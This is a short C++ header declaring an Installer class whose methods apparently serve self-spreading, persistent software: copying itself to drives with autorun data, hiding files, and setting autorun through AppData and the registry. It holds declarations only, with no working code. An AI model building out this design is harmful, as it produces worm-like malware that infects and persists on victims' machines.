#pragma once
#include "stdafx.h"

class Installer
{
public:
	Installer();
	~Installer();

	bool SetAutorun(bool autorun);
	bool InstallOnDrives();

private:
	bool CopyTo(const TCHAR* path);
	bool HideFile(const TCHAR* path);
	bool SetAutorunAppdata(bool autorun);
	bool SetAutorunRegistry(bool autorun);

	TCHAR exeName[MAX_PATH];
	TCHAR appDataPath[1024];
	TCHAR registryPath[1024];

	char autorunData[1024];
	size_t autorunBytes;
};

extern Installer installer;